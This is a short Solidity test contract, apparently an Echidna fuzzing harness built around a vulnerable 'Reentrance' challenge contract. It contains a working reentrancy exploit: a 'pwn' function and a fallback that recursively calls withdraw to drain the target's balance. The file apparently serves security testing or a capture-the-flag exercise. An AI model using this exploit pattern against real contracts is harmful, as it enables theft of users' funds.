pragma solidity ^0.5.0;

import 'contract.sol';

contract Test {
  Reentrance r;

  constructor() public payable {
    r = new Reentrance();
    r.donate.value(10 ether)(address(0x12345));
  }

  function donate() public {
    r.donate.value(1 ether)(address(this));
  }

  function pwn() public {
    r.withdraw(1 ether);
  }

  function() external payable {
    uint steal = address(msg.sender).balance;
    steal = steal > 1 ether ? 1 ether : steal;
    if (steal != 0)
      address(msg.sender).call.gas(100 ether)(abi.encodeWithSignature("withdraw(uint256)", steal));
  }

  function echidna_test_balance() public returns (bool) {
    return address(r).balance > 0;
  }
}
